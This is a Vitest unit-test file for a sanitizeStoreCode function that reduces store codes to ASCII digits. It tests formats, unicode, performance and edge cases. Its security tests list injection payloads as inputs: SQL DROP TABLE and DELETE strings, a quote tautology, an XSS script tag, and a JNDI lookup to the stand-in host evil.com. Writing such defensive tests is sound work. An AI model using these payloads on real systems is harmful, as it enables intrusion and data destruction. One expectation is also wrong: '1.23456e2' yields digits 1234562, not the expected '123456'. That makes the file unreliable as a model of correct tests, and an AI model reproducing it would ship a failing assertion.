// Unit test for input sanitization function
// Tests the sanitizeStoreCode function for various input scenarios
// Created: 2025-09-16

import { describe, it, expect } from 'vitest';

// Import will fail initially (TDD requirement)
// The sanitizeStoreCode function should not exist yet
import { sanitizeStoreCode } from '../../lib/validation/sanitize-input';

describe('Input Sanitization - Unit Tests', () => {
  describe('sanitizeStoreCode function', () => {
    it('should remove all non-digit characters', () => {
      const testCases = [
        { input: '123-456', expected: '123456' },
        { input: '123 456', expected: '123456' },
        { input: '123.456', expected: '123456' },
        { input: '123,456', expected: '123456' },
        { input: '123_456', expected: '123456' },
        { input: '123abc456', expected: '123456' },
        { input: 'abc123def456ghi', expected: '123456' },
        { input: '!@#123$%^456&*()', expected: '123456' }
      ];

      testCases.forEach(({ input, expected }) => {
        expect(sanitizeStoreCode(input)).toBe(expected);
      });
    });

    it('should handle pure numeric strings correctly', () => {
      const testCases = [
        { input: '123456', expected: '123456' },
        { input: '000000', expected: '000000' },
        { input: '999999', expected: '999999' },
        { input: '1', expected: '1' },
        { input: '12345678901234567890', expected: '12345678901234567890' }
      ];

      testCases.forEach(({ input, expected }) => {
        expect(sanitizeStoreCode(input)).toBe(expected);
      });
    });

    it('should handle empty and whitespace inputs', () => {
      const testCases = [
        { input: '', expected: '' },
        { input: '   ', expected: '' },
        { input: '\t\n\r', expected: '' },
        { input: '  \t\n  ', expected: '' }
      ];

      testCases.forEach(({ input, expected }) => {
        expect(sanitizeStoreCode(input)).toBe(expected);
      });
    });

    it('should handle special characters and unicode', () => {
      const testCases = [
        { input: '１２３４５６', expected: '' }, // Full-width digits (not ASCII)
        { input: '123456!@#', expected: '123456' },
        { input: '🔢123456📱', expected: '123456' },
        { input: '½¾123456', expected: '123456' },
        { input: 'Ⅰ123456Ⅱ', expected: '123456' },
        { input: '±123456°', expected: '123456' }
      ];

      testCases.forEach(({ input, expected }) => {
        expect(sanitizeStoreCode(input)).toBe(expected);
      });
    });

    it('should handle null and undefined inputs safely', () => {
      // Function should handle edge cases gracefully
      expect(sanitizeStoreCode(null as any)).toBe('');
      expect(sanitizeStoreCode(undefined as any)).toBe('');
    });

    it('should handle very long inputs efficiently', () => {
      const longInput = 'a'.repeat(10000) + '123456' + 'b'.repeat(10000);
      const result = sanitizeStoreCode(longInput);

      expect(result).toBe('123456');
      expect(result.length).toBe(6);
    });

    it('should preserve digit order', () => {
      const testCases = [
        { input: 'a1b2c3d4e5f6g', expected: '123456' },
        { input: '9a8b7c6d5e4f3g2h1i0', expected: '9876543210' },
        { input: 'x1y2z3a4b5c6', expected: '123456' }
      ];

      testCases.forEach(({ input, expected }) => {
        expect(sanitizeStoreCode(input)).toBe(expected);
      });
    });

    it('should handle various international number formats', () => {
      const testCases = [
        { input: '123-456', expected: '123456' }, // US format
        { input: '123.456', expected: '123456' }, // European format
        { input: '123 456', expected: '123456' }, // Space separated
        { input: '123,456', expected: '123456' }, // Comma separated
        { input: '(123) 456', expected: '123456' }, // Phone format
        { input: '+1-123-456', expected: '1123456' }, // International format
      ];

      testCases.forEach(({ input, expected }) => {
        expect(sanitizeStoreCode(input)).toBe(expected);
      });
    });

    it('should be idempotent for already clean inputs', () => {
      const cleanInputs = ['123456', '000000', '999999', '1', ''];

      cleanInputs.forEach(input => {
        const firstResult = sanitizeStoreCode(input);
        const secondResult = sanitizeStoreCode(firstResult);
        expect(firstResult).toBe(secondResult);
      });
    });

    it('should handle mixed case letters with digits', () => {
      const testCases = [
        { input: 'ABC123def456GHI', expected: '123456' },
        { input: 'Store123Code456', expected: '123456' },
        { input: 'UPPERCASE123lowercase456', expected: '123456' }
      ];

      testCases.forEach(({ input, expected }) => {
        expect(sanitizeStoreCode(input)).toBe(expected);
      });
    });

    it('should handle scientific notation and mathematical expressions', () => {
      const testCases = [
        { input: '1.23456e2', expected: '123456' },
        { input: '123+456', expected: '123456' },
        { input: '123*456', expected: '123456' },
        { input: '123/456', expected: '123456' },
        { input: '123^456', expected: '123456' },
        { input: '123%456', expected: '123456' }
      ];

      testCases.forEach(({ input, expected }) => {
        expect(sanitizeStoreCode(input)).toBe(expected);
      });
    });
  });

  describe('Performance Tests', () => {
    it('should sanitize input quickly', () => {
      const complexInput = '!@#$%^&*()ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456🚀🎉🔥💯';

      const startTime = performance.now();
      const result = sanitizeStoreCode(complexInput);
      const endTime = performance.now();

      expect(result).toBe('123456');
      expect(endTime - startTime).toBeLessThan(1); // Should complete in less than 1ms
    });

    it('should handle repeated sanitization efficiently', () => {
      const input = 'abc123def456ghi';
      const iterations = 1000;

      const startTime = performance.now();
      for (let i = 0; i < iterations; i++) {
        sanitizeStoreCode(input);
      }
      const endTime = performance.now();

      const avgTime = (endTime - startTime) / iterations;
      expect(avgTime).toBeLessThan(0.01); // Average should be less than 0.01ms per call
    });
  });

  describe('Edge Cases and Error Handling', () => {
    it('should handle non-string types gracefully', () => {
      const nonStringInputs = [
        123456,
        true,
        false,
        [],
        {},
        new Date(),
        Symbol('test')
      ];

      nonStringInputs.forEach(input => {
        // Function should convert to string or handle gracefully
        expect(() => sanitizeStoreCode(input as any)).not.toThrow();
      });
    });

    it('should handle extremely large numbers', () => {
      const largeNumber = '9'.repeat(1000000); // 1 million digits

      expect(() => sanitizeStoreCode(largeNumber)).not.toThrow();

      const result = sanitizeStoreCode(largeNumber);
      expect(result).toBe(largeNumber); // Should preserve all digits
      expect(result.length).toBe(1000000);
    });

    it('should handle all ASCII control characters', () => {
      // Test all ASCII control characters (0-31 and 127)
      let controlChars = '';
      for (let i = 0; i <= 31; i++) {
        controlChars += String.fromCharCode(i);
      }
      controlChars += String.fromCharCode(127); // DEL character

      const input = controlChars + '123456' + controlChars;
      const result = sanitizeStoreCode(input);

      expect(result).toBe('123456');
    });

    it('should handle all printable ASCII characters', () => {
      // Test all printable ASCII characters except digits
      let printableChars = '';
      for (let i = 32; i <= 126; i++) {
        const char = String.fromCharCode(i);
        if (!/\d/.test(char)) {
          printableChars += char;
        }
      }

      const input = printableChars + '123456' + printableChars;
      const result = sanitizeStoreCode(input);

      expect(result).toBe('123456');
    });
  });

  describe('Security Tests', () => {
    it('should not be vulnerable to injection attacks', () => {
      const maliciousInputs = [
        "'; DROP TABLE stores; --123456",
        '123456<script>alert("xss")</script>',
        '123456"; DELETE FROM users; --',
        '123456\'||\'1\'=\'1',
        '123456${jndi:ldap://evil.com/a}'
      ];

      maliciousInputs.forEach(input => {
        const result = sanitizeStoreCode(input);
        // Should only contain digits
        expect(result).toMatch(/^\d*$/);
        expect(result).toContain('123456');
      });
    });

    it('should handle buffer overflow attempts', () => {
      const overflowAttempt = 'A'.repeat(65536) + '123456' + 'B'.repeat(65536);

      expect(() => sanitizeStoreCode(overflowAttempt)).not.toThrow();

      const result = sanitizeStoreCode(overflowAttempt);
      expect(result).toBe('123456');
    });
  });
});